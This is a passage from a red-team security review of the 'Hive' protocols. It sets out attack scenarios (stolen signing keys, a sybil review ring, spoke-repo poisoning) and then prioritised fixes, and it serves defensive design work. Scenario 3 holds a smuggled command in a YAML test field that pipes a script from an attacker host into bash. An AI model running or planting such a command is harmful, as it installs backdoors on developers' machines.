3. **T0+30m — Key Extraction:** Attacker logs into GitHub, clones `@charlie`'s private repos, extracts SSH private key from `.ssh/id_ed25519` (committed by accident)
4. **T1 — Exploitation Begins:** Attacker can now sign commits as `@charlie`
5. **T1+2h — Malicious PR #1:** Attacker submits PR to PublicHive with backdoor in npm dependency
   - PR is signed with `@charlie`'s key → passes CI Gate 1
   - Attacker adds comment: "Quick fix for dependency resolution issue"
   - Maintainer reviews, sees `@charlie` is trusted, merges
6. **T1+4h — Malicious PR #2:** Attacker submits PR to CommunityHive with credential harvesting code
   - Again, signed commit passes verification
   - Merged based on `@charlie`'s reputation
7. **T1+6h — Detection:** `@charlie` notices suspicious GitHub activity, realizes compromise
8. **T1+8h — Attempted Remediation:** `@charlie` submits key rotation PRs to all 3 hives
   - PublicHive maintainer responds in 2 hours, merges rotation
   - CommunityHive maintainer responds in 8 hours
   - EnterpriseHive maintainer responds in 24 hours (weekend)
9. **T1+24h — Continued Exploitation:** Attacker still has valid signing authority in CommunityHive and EnterpriseHive for 16-22 hours after detection
10. **T2+1w — Residual Impact:** Malicious commits from T1 remain in git history with valid signatures. Forensic analysis cannot distinguish attacker's commits from `@charlie`'s legitimate commits.

**Impact:**
- 3 hives compromised
- 2 backdoors deployed to production
- 24-48 hour window of continued exploitation after detection
- Permanent signature validity on malicious commits

**Why It Succeeded:**
- Finding C-1: Inadequate key revocation mechanism
- Finding C-3: Cross-hub identity theft via key reuse
- No timestamping to distinguish pre-compromise from post-compromise signatures

**Mitigation:** Implement recommendations from C-1 (timestamped revocation) and C-3 (cross-hub revocation registry).

---

### Scenario 2: Sybil Ring → Badge Farming → High-Value Target

**Attacker Profile:** Sophisticated, motivated (APT / competitive intelligence)

**Target:** High-security EnterpriseHive

**Attack Path:**

1. **Phase 1 — Sybil Creation (T0-30d):**
   - Attacker creates 5 GitHub accounts with realistic profiles
   - Operators: `@alice_dev`, `@bob_sec`, `@carol_backend`, `@dave_frontend`, `@eve_devops`
   - Each account has commit history on public projects (legitimacy building)

2. **Phase 2 — Infiltration (T30d-60d):**
   - `@alice_dev` joins PublicHive (open membership, low barrier)
   - Submits 3 legitimate PRs to build initial reputation
   - Gets promoted to "trusted" status after 10 positive reviews

3. **Phase 3 — Vouching (T60d-90d):**
   - `@alice_dev` vouches for `@bob_sec`, `@carol_backend`, `@dave_frontend`, `@eve_devops`
   - All 5 now members of PublicHive
   - They form a review ring: submit trivial PRs, review each other positively

4. **Phase 4 — Badge Farming (T90d-120d):**
   - Each operator completes 10+ work items (pair programming on each other's PRs counts as completion)
   - Maintain 100% positive feedback through mutual reviews
   - All 5 earn "Hive Star" badge by T120d

5. **Phase 5 — Reputation Laundering (T120d-180d):**
   - Operators continue activity in PublicHive
   - Build to 50+ positive reviews each, 95%+ positive rating
   - Profiles show: "Hive Star badge holder, 95% positive (50 reviews)"

6. **Phase 6 — Target Infiltration (T180d):**
   - `@alice_dev` applies to join EnterpriseHive (closed, invite-only)
   - Application includes: "PublicHive member, Hive Star badge, 95% positive, vouched by 2 maintainers"
   - EnterpriseHive maintainer reviews, sees strong cross-hive reputation
   - Trusts the PublicHive reputation signals (doesn't know it's gamed)
   - `@alice_dev` is approved

7. **Phase 7 — Exploitation:**
   - `@alice_dev` now has access to EnterpriseHive's private projects
   - Exfiltrates proprietary code, trade secrets, internal documentation
   - Operates for 60+ days before detection (reputation provides cover)

**Impact:**
- 6 months of preparation undetected
- High-value target compromised
- Attacker used legitimate protocol mechanisms (vouching, badges, cross-hive reputation)

**Why It Succeeded:**
- Finding M-3: Trust score gaming via sybil attacks
- No graph analysis of review reciprocity
- No weighting of cross-hive reputation by hive reputation
- Badge system has no sybil resistance

**Mitigation:** Implement recommendations from M-3 (graph analysis, vouch cooldowns, cross-hive weighting).

---

### Scenario 3: Supply Chain Attack via Spoke Discovery

**Attacker Profile:** Targeted, sophisticated (nation-state)

**Target:** Hub with valuable intellectual property or infrastructure access

**Attack Path:**

1. **Phase 1 — Research (T0-14d):**
   - Attacker identifies target hub: `security-research/hive` (contains security research, vulnerability disclosures)
   - Enumerates hub's current spokes via `hive-spoke pull`
   - Identifies spoke repos, operators, trust zones

2. **Phase 2 — Spoke Repo Compromise (T14d):**
   - Attacker targets operator `@frank` (trusted zone, active contributor)
   - Compromises `@frank`'s GitHub account via OAuth token phishing
   - Attacker has write access to `frank/crypto-research` spoke repo

3. **Phase 3 — Spoke Poisoning (T14d+1h):**
   - Attacker modifies `frank/crypto-research/.collab/status.yaml`:
     ```yaml
     status:
       test: "pytest && curl -s https://attacker.com/backdoor.sh | bash"
     ```
   - Commits with `@frank`'s signing key (extracted from compromised machine)
   - Push to spoke repo

4. **Phase 4 — Hub Infection (T14d+2h):**
   - Hub's scheduled `hive-spoke pull` fetches updated `.collab/` from `frank/crypto-research`
   - If hub naively executes `status.test` command (Finding M-4):
     - `pytest` runs (appears normal)
     - `curl ... | bash` installs backdoor on hub operator's machine
   - Backdoor establishes persistence (cron job, SSH authorized_keys)

5. **Phase 5 — Lateral Movement:**
   - Attacker pivots from hub operator's machine to hub repo
   - Exfiltrates all hub data (PROJECT.yaml files, allowed-signers, trust scores)
   - Identifies other high-value operators and targets

6. **Phase 6 — Supply Chain Propagation:**
   - Attacker modifies hub's `allowed-signers` file (adds attacker's key)
   - Submits malicious PRs to multiple spoke repos, all passing signature verification
   - Backdoor propagates to all hub members who run `hive-spoke pull`

**Impact:**
- Complete hub compromise
- Supply chain attack affecting all hub members
- Attacker has persistent access, can maintain indefinitely

**Why It Succeeded:**
- Finding C-2: Spoke spoofing via repo compromise
- Finding M-4: Command injection via status.test
- No sandboxing of spoke execution
- No anomaly detection on spoke status changes

**Mitigation:** Implement recommendations from C-2 (enforce signature verification, add TOFU model) and M-4 (remove executable test field, sandbox if required).

---

## Recommendation

### Prioritized Action Items

#### CRITICAL (Must Fix Before Widespread Adoption)

1. **C-1: Implement Key Revocation with Timestamps**
   - Add `identity.keyRegistered` and revocation timestamps
   - CI must verify `commit.timestamp < key.revocationTimestamp`
   - Add emergency revocation mechanism

2. **C-2: Mandate Signature Verification on Pull**
   - Change "should enforce" to "MUST enforce" in spoke-protocol.md
   - Add hub-side verification requirement to CLI
   - Implement TOFU model for spoke provenance

3. **C-3: Design Cross-Hive Revocation Propagation**
   - Create opt-in revocation registry specification
   - Add `revoked_keys` section to operator.yaml
   - Document multi-hive key reuse risks

#### MEDIUM (Strongly Recommended)

4. **M-1: Add Privacy Mode for status.yaml**
   - Make operational fields optional
   - Implement aggregated/hashed alternatives
   - Add operator control via spoke manifest

5. **M-2: Specify Supply Chain Security Requirements**
   - Document CI hardening best practices
   - Provide reference GitHub Actions workflow
   - Add CI verification audit logging

6. **M-3: Add Sybil Resistance Mechanisms**
   - Implement review reciprocity analysis
   - Add vouch network depth limits
   - Weight cross-hive reputation by source hive

7. **M-4: Remove Executable status.test Field**
   - Change to human-readable string only
   - Or: Specify sandboxed execution environment
   - Add explicit "DO NOT EXECUTE" warning

#### LOW (Quality of Life / Hardening)

8. **L-1 through L-6:** Address open questions, add guardrails, specify thresholds

---

### Overall Assessment

The Hive protocols demonstrate mature security thinking. The cryptographic foundation (Ed25519 signing), four-layer verification model, and explicit threat acknowledgment show a design informed by real-world adversarial conditions.

The critical findings center on key lifecycle management (revocation, cross-hive propagation) and trust system gamification. These are solvable with protocol enhancements that don't require fundamental redesign.

**The protocols are production-ready for limited deployment** (single hive, known operators, manual verification) **but require hardening for open-network scale** (multiple hives, unknown operators, automated trust).

**Recommendation:** Address critical findings (C-1, C-2, C-3) before promoting protocols from "Review" to "Accepted" status. Medium findings can be addressed iteratively post-launch.

---

**End of Review**

Generated: 2026-02-09  
Reviewed by: @Steffen025 (Human) + Jeremy (AI, Claude Opus 4)  
Review Mode: Adversarial / Red Team  
Tool: Static analysis of specifications, threat modeling, attack scenario construction

---

**Note for Maintainers:**

This review intentionally adopts an adversarial perspective to stress-test the protocols. The findings do not imply the protocols are "broken" — they identify opportunities for hardening before widespread adoption. All distributed trust systems have trade-offs; the goal is to make those trade-offs explicit and informed.

The protocols' commitment to transparency (explicit security sections, acknowledged open questions) is a strength. This review continues that tradition by documenting attack scenarios that may not have been considered during initial design.

**Next Steps:**
1. Protocol maintainers review findings and prioritize remediation
2. For critical findings: Propose protocol amendments or implementation guidelines
3. For medium findings: Add to implementation recommendations or hub configuration options
4. For low findings: Address in documentation or future protocol versions
5. Update protocol status from "Review" to "Accepted" once critical findings are resolved
